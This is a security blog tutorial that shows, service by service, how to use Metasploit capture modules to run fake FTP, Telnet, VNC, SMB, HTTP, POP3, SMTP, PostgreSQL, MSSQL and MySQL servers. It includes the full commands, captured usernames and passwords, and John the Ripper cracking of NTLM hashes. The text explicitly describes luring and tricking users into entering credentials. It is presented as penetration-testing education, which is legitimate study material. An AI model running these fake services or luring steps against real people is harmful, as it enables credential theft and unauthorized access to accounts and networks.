<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: Fake Services</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-fake-services/" rel="bookmark"><time class="entry-date published" datetime="2020-08-23T16:39:43+00:00">August 23, 2020</time><time class="updated" datetime="2025-07-16T11:43:38+00:00">July 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Have you ever heard about Fake services? Attackers can perform credential dumping by exploiting open ports like ftp, telnet, smb, etc. to gain sensitive data like usernames and passwords.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<ol>
<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li><span style="color: #000000;"><strong>ftp</strong></span></li>
<li><span style="color: #000000;"><strong>telnet</strong></span></li>
<li><span style="color: #000000;"><strong>vnc</strong></span></li>
<li><span style="color: #000000;"><strong>SMB</strong></span></li>
<li><span style="color: #000000;"><strong>http_basic</strong></span></li>
<li><span style="color: #000000;"><strong>Pop3</strong></span></li>
<li><span style="color: #000000;"><strong>SMTP</strong></span></li>
<li><span style="color: #000000;"><strong>Postgresql</strong></span></li>
<li><span style="color: #000000;"><strong>MsSql</strong></span></li>
<li><span style="color: #000000;"><strong>http_ntlm</strong></span></li>
<li><span style="color: #000000;"><strong>MsSql</strong></span></li>
</ol>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span> </span></h3>
<p><span style="color: #000000;">In Metasploit by making use of auxiliary modules, you can fake any server of choice and gain credentials of the victim. For your server to be used, you can make use of search command to look for modules. So, to get you started, switch on your Kali Linux machines and start Metasploit using the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole</pre>
<h3><span style="color: #800000;">FTP</span></h3>
<p><span style="color: #000000;">FTP stands for ‘file transferring Protocol’ used for the transfer of computer files between a client and server on a computer network at port 21. This module provides a fake FTP service that is designed to capture authentication credentials.</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/ftp
msf5 auxiliary(server/capture/ftp) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ftp) &gt; set banner Welcome to Hacking Articles
msf5 auxiliary(server/capture/ftp) &gt; exploit</pre>
<p><span style="color: #000000;">Here you see that the server has started and the module is running.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-6co2PckWxZM/X0KLZVh8VWI/AAAAAAAAnjM/nkpx-xM0gF8_Z_Is0lnZqQBd2NKQph3ogCLcBGAsYHQ/s1600/1.png"/></strong></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the FTP port and IP address, you can see that the port is open.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p21 &lt;ip address&gt;
ftp 192.168.0.102</pre>
<p><span style="color: #000000;">Now to lure the user into believing, it to be a genuine login page you can trick the user in opening the ftp login page. It will display, ‘Welcome to Hacking Articles’ and it will ask the user to put his user Id and password.</span></p>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-T6bVOCxo0oE/X0KLe2lo8eI/AAAAAAAAnjQ/FDqneBwNnswJmHNbwSJX1CCKuvvOm-_bACLcBGAsYHQ/s1600/2.png"/></strong></span></p>
<p><span style="color: #000000;">It will show the user that the login is failed, but the user ID and password will be captured by the listener.</span></p>
<p><span style="color: #000000;">You see that the ID /Password is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fwnmbd0qUSE/X0KLlmRRK8I/AAAAAAAAnjU/_mutfmNnqpoG9qSNxvBYb8YJl094cEavwCLcBGAsYHQ/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Telnet</span></h3>
<p><span style="color: #000000;">Telnet is a networking protocol that allows a user on one computer to log into another computer that is part of the same network at port 23. This module provides a fake Telnet service that is designed to capture authentication credentials.</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/telnet
msf5 auxiliary(server/capture/ telnet) &gt; set banner Welcome to Hacking Articles
msf5 auxiliary(server/capture/ telnet) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ telnet) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pGQec_qtzWI/X0KLuZhnNCI/AAAAAAAAnjY/Bl8s14gOrSgxffqlMQZ4ikS6M-6XpTTcQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the Telnet port and IP address, you can see that the port is open.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p23&lt;ip address&gt;
telnet 192.168.0.102</pre>
<p><span style="color: #000000;">Then to lure the user into believing, it to be a genuine login page you can trick the user in opening the Telnet login page. It will display, ‘Welcome to Hacking Articles’ and it will ask the user to put his user Id and password.</span></p>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Mbp4-ENt3Os/X0KL16TsOrI/AAAAAAAAnjg/lhtqc3MMImEdvrinvOwqNas_01_LbC94gCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">It will show the user that the login is failed, but the user ID and password will be captured by the listener.</span></p>
<p><span style="color: #000000;">You see that the ID /Password is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ignite/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n8-CpR7baNA/X0KL9BLSsXI/AAAAAAAAnjk/e8CM0IyyCuYuq2dIN7GyzwI6EssUFPxSgCLcBGAsYHQ/s1600/6.png"/></span></p>
<h3><span style="color: #800000;">VNC</span></h3>
<p><span style="color: #000000;">VNC Virtual Network Computing is a graphical desktop sharing system that uses the Remote Frame Buffer protocol to remotely control another computer at port 5900. This module provides a fake VNC service that is designed to capture authentication credentials.</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/vnc
msf5 auxiliary(server/capture/ vnc) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ vnc) &gt; set johnpwfile /root/Desktop/
msf5 auxiliary(server/capture/ vnc) &gt; exploit</pre>
<p><span style="color: #000000;">Here we use JOHNPWFILE option to save the captures hashes in John the Ripper format. Here we see that the module is running and the listener has started.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gS5o4fLDVpA/X0KMESIcUaI/AAAAAAAAnjs/3Y_A2Bs2iaMMXcsEgflExLLFowy6GCHWQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the vnc port and IP address, you can see that the port is open.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5900 &lt;ip address&gt;
vncviewer 192.168.0.102</pre>
<p><span style="color: #000000;">According to the user, it would be a genuine page, as on starting vncviewer he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YwRk457Hr7A/X0KMLo4RxDI/AAAAAAAAnj0/-7__OcJ6-S0Za2kLrLcMtpuEf-11DosAgCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">It will show that there was an authentication failure; however, the system captures the hash for the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0tAnU9N_h8Y/X0KMRgMe_dI/AAAAAAAAnj4/8PE4lfCT31Q0gDDt73d9eJkbu3fdsirEgCLcBGAsYHQ/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">SMB</span></h3>
<p><span style="color: #000000;">SMB stands for Server Message Block, which is used to share printers, files, etc., on port 445. Moreover, this module provides an SMB service that you can use to capture the challenge-response password hashes of the SMB client system.</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/ smb) &gt; set johnpwfile /root/ Desktop/
msf5 auxiliary(server/capture/ smb) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ smb) &gt; exploit</pre>
<p><span style="color: #000000;">The server captures credentials in a hash value, which you can later crack; therefore, you can use the johnpw file of John the Ripper</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-15pskMoGRCI/X0KMa8ZS-SI/AAAAAAAAnkA/u3mjQB3aGy4FclGv7s8MS5-b_6mDOl2cwCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the smb port and IP address, you can see that the port is open</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p445 &lt;ip address&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9AJk-s_0Ook/X0KMh9b7yyI/AAAAAAAAnkM/6ISRlz-fNNsbLSNUJklGSw1G26PVVD6awCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">As a result, this module will now generate a spoofed window security prompt on the victim’s system to establish a connection with another system in order to access shared folders of that system.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-g6vPoR4tDds/X0KMnc71A3I/AAAAAAAAnkQ/Z8nt78pmIncVVvjOKiTOJrQLBel1VEgSgCLcBGAsYHQ/s1600/12.png"/></strong></span></p>
<p><span style="color: #000000;">It will show the user that the login failure, but the credentials will be captured by the listener. Here you can see that the listener has captured the user and the domain name. It has also generated an NT hash which can be decrypted with John the ripper.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-6FYWo-C3t-w/X0KMvGi5SmI/AAAAAAAAnkU/F7KjtZ4Yco4uJCHYeUlpsnxmvjtu1C1xwCLcBGAsYHQ/s1600/14.png"/></strong></span></p>
<p><span style="color: #000000;">Here you can see that the hash file generated on the desktop can be decrypted using                           </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p><span style="color: #000000;">And here you see that the password is in text form, <strong>123 </strong>for user <strong>Raj</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j0AhTYjkOis/X0KM1vCZuTI/AAAAAAAAnkc/rGkdk7ZHxuwJYQUfiRyPtBLWogL8j2B1gCLcBGAsYHQ/s1600/15.png"/></span></p>
<h3><span style="color: #800000;">http_basic</span></h3>
<p><span style="color: #000000;">This module responds to all requests for resources with an HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console. This may be helpful in some phishing expeditions where it is possible to embed a resource into a page</span></p>
<p><span style="color: #000000;">To exploit HTTP (80), you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/ http_basic
msf5 auxiliary(server/capture/ http_basic) &gt; set RedirectURL www.hackingarticles.in
msf5 auxiliary(server/capture/ http_basic) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ http_basic) &gt; set uripath sales
msf5 auxiliary(server/capture/ http_basic) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5vF959BbFeI/X0KM8wDIIeI/AAAAAAAAnkg/fQMxVJ2z6w06ZavtfTmyWFn7SWKU573eQCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">As a result, this module will now generate a spoofed login prompt on the victim’s system when they open an HTTP URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uxER4Pgz5ys/X0KNEaoJn4I/AAAAAAAAnkk/6fFCaE0G03oumFcKmKJJm-uC9AbGCWR2gCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">It will show the user that the login has failed; nevertheless, the listener will capture the user ID and password.</span></p>
<p><span style="color: #000000;">You see that the ID /Password is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nqsCaXxzp0A/X0KNLIc8WbI/AAAAAAAAnks/npIh-6N4obwybkDo_Z-OETap184D0HxfACLcBGAsYHQ/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">POP3</span></h3>
<p><span style="color: #000000;">POP3 is a client/server protocol in which the Internet server receives and holds your e-mail at port 110. Additionally, this module provides a fake POP3 service designed to capture authentication credentials.</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/pop3
msf5 auxiliary(server/capture/pop3) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/pop3) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E88dIlaKDZE/X0KNR2kmS3I/AAAAAAAAnk0/-4RnCHvYA1gydZ99yUbk-2HjWKtHxtxjQCLcBGAsYHQ/s1600/19.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the POP3 port and IP address, you can see that the port is open</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p110 &lt;ip address&gt;
telnet 192.168.0.102 110</pre>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-baieXYZ6OrE/X0KNYiAro-I/AAAAAAAAnk8/T0pEV2TuYMsVqQh0_5Y1k9n2fDDt488VACLcBGAsYHQ/s1600/20.png"/></span></p>
<p><span style="color: #000000;">You see that the User /Password captured by the listener is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj/123</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-HCcJLXikVdI/X0KNeGy0rCI/AAAAAAAAnlE/orj9njVs510kn3DeorqLxgVnNLaPM1QUQCLcBGAsYHQ/s1600/21.png"/></strong></span></p>
<h3><span style="color: #800000;">SMTP</span></h3>
<p><span style="color: #000000;">SMTP stands for Simple Mail Transfer Protocol which is a communication protocol for electronic mail transmission at port 25. This module provides a fake SMTP service that is designed to capture authentication credentials</span></p>
<p><span style="color: #000000;">To achieve this, you can type</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/smtp
msf5 auxiliary(server/capture/smtp) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/smtp) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-60pdFnj_gpk/X0KNjnXcWHI/AAAAAAAAnlM/ioAseI5nlNsJj6xLKwHUnHUEDgrQJGu3QCLcBGAsYHQ/s1600/22.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the SMTP port and IP address, you can see that the port is open</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p25 &lt;ip address&gt;
telnet 192.168.0.102 25</pre>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CE3Wkc5Uugk/X0KNvX4or-I/AAAAAAAAnlc/fUTpyhLzac0qCcElLWzffuUImAfR_IiQQCLcBGAsYHQ/s1600/23.png"/></span></p>
<p><span style="color: #000000;">On adding the ID and password, it will show server error to the user, but it will be captured by the listener</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vbt4v6gH9uU/X0KN2aBv65I/AAAAAAAAnlk/CKkuwcIcA6cQ-FrX4O9-hpOXW2Nv4vnYgCLcBGAsYHQ/s1600/24.png"/></span></p>
<h3><span style="color: #800000;">PostgreSQL</span></h3>
<p><span style="color: #000000;">Postgresql is an opensource database which is widely available at port 5432. This module provides a fake PostgreSQL service that is designed to capture clear-text authentication credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/postgresql
msf5 auxiliary (server/capture/ postgresql) &gt; set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ postgresql) &gt; exploit</pre>
<pre class="lang:default decode:true"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tSyKgsxsTL0/X0KN9NX2XKI/AAAAAAAAnls/KbqgQjMSkukJFxs8G98PIy2-4rHDx1FIQCLcBGAsYHQ/s1600/25.png"/></span></pre>
<p><span style="color: #000000;">On doing a Nmap scan with the PostgreSQL port and IP address, you can see that the port is open</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5432 &lt;ip address&gt;
psql -h 192.168.0.102 -U raj</pre>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UZseutRcrio/X0KODPNgMII/AAAAAAAAnlw/uwJ58C8OrcoRDMGFM8ENM9n20bBiuFhbQCLcBGAsYHQ/s1600/26.png"/></span></p>
<p><span style="color: #000000;">When the user adds their ID and password, it will display a server error; however, the listener will capture the credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raj/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t4ttAUzKjLs/X0KOKLjEdKI/AAAAAAAAnl4/xgObTAL5A0wDc5_9GFQYaTqpR210EN11wCLcBGAsYHQ/s1600/27.png"/></span></p>
<h3><span style="color: #800000;">MsSQL</span></h3>
<p><span style="color: #000000;">MSSQL is a database management system developed by Microsoft, widely available on port 1433. Furthermore, this module provides a fake MSSQL service designed to capture authentication credentials. It supports both weakly encoded database logins and Windows logins (NTLM).</span></p>
<p><span style="color: #000000;">To achieve this,</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/mssql
msf5 auxiliary (server/capture/ mssql) &gt; set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ mssql) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-35KjnCaJGZ4/X0KOQRWgl4I/AAAAAAAAnmA/tGjRsHKsYcM6l5hX7JgL4OqA47s5dWKgQCLcBGAsYHQ/s1600/28.png"/></span></p>
<p><span style="color: #000000;">It will open a fake Microsoft session manager window<strong>. </strong>According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1EVLzPtoBlw/X0KOWKvKDNI/AAAAAAAAnmI/u250SI1CqJktGO4QiN1jh5t4_Ny8IiezgCLcBGAsYHQ/s1600/29.png"/></span></p>
<p><span style="color: #000000;">On adding the ID and password, it will show server error to the user, but it will be captured by the listener</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">User/ID: raj/123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vqytOqilRqg/X0KOduZmzcI/AAAAAAAAnmM/WiOyqTKlztAzVQsc5jpCx_ugTSW1bG6xgCLcBGAsYHQ/s1600/30.png"/></span></p>
<h3><span style="color: #800000;">http_ntlm</span></h3>
<p><span style="color: #000000;">The <strong>http_ntlm</strong> capture module tries to quietly catch NTLM challenge hashes over HTTP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/ http_ntlm
msf5 auxiliary(server/capture/ http_ntlm) &gt; set johnpwfile /root/Desktop
msf5 auxiliary(server/capture/ http_ntlm) &gt; set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ http_ntlm) &gt; set uripath report
msf5 auxiliary(server/capture/ http_ntlm) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A4WI9cg0pAk/X0KOjS1wmjI/AAAAAAAAnmU/XvhHBda2vQMm9twzfzAW5htH0nKN1OmtQCLcBGAsYHQ/s1600/31.png"/></span></p>
<p><span style="color: #000000;">As a result, this module will now create a spoofed login prompt on the victim’s system when someone opens an http URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GEgoGlBU4FQ/X0KOowPyveI/AAAAAAAAnmc/oOcbiSLiNKEraik820g_ZtQstD4YhKrmgCLcBGAsYHQ/s1600/32.png"/></span></p>
<p><span style="color: #000000;">It will show the user that the logon failure, but the listener will capture the credentials. Here you can see that the listener has captured the user and the domain name. The listener has also generated an NT hash which John the Ripper can decrypt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-51IhJ4GnB90/X0KOuXvpQPI/AAAAAAAAnmk/u-4FrhZyI-wNbbHoiukOo_B91nrw7G4mgCLcBGAsYHQ/s1600/33.png"/></span></p>
<p><span style="color: #000000;">And here you see that the password Here you can see that the hash file generated on the desktop can be decrypted using                                                                                                                                                                                             </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john _netntlmv2</pre>
<p><span style="color: #000000;">And here you see that the password is in text form, <strong>123 </strong>for user <strong>Raj</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-274gSilDUss/X0KO1BlmPgI/AAAAAAAAnms/Tphbgs_Fwi0sH3J3HD6UfqfmMtCcznZVwCLcBGAsYHQ/s1600/34.png"/></span></p>
<h3><span style="color: #800000;"><strong>MySQL</strong></span></h3>
<p><span style="color: #000000;">It is an opensource database management system at port 3306. This module offers a fake MySQL service that captures authentication credentials. It collects challenge and response pairs that Johntheripper can use for cracking.</span></p>
<p><span style="color: #000000;">To achieve this,</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use auxiliary/server/capture/mysql
msf5 auxiliary (server/capture/ mysql) &gt; set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ mysql) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5AvewbkLXeU/X0KO9nqZzRI/AAAAAAAAnm0/qeM3y7xTRnMUps_wH7TAkxOLYJwhdGu9wCLcBGAsYHQ/s1600/35.png"/></span></p>
<p><span style="color: #000000;">On doing a Nmap scan with the MySql port and IP address, you can see that the port is open</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p3306 &lt;ip address&gt;
mysql -h 192.168.0.102 -u root -p</pre>
<p><span style="color: #000000;">According to the user, it would be a genuine page, he will put his user ID and password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xlk2K8Hv0uY/X0KPD5YkMdI/AAAAAAAAnm8/I6qYa8MvKdYVIe0JGyqtlkP5T_YVfnvrwCLcBGAsYHQ/s1600/36.png"/></span></p>
<p><span style="color: #000000;">You see that the User /Password captured by the listener is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aMDJSISfVlk/X0KPJcgdmbI/AAAAAAAAnnE/hAXFNFfYd88ThQ0Pm8DOq7cNe04JEH21QCLcBGAsYHQ/s1600/37.png"/></span></p>
<h3><span style="color: #800000;">Conclusion </span></h3>
<p><span style="color: #000000;">Hence, by using these various auxiliary modules, you can exploit the various open ports and create fake servers and capture credentials.</span></p>
<p>To learn more on Credential Dumping. Follow this <strong><a href="https://www.hackingarticles.in/tag/credential-dumping/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author: </strong>Jeenali Kothari is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on<strong><a style="color: #000000;" href="https://www.linkedin.com/in/jeenali-kothari"> <span style="color: #0000ff;">Here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
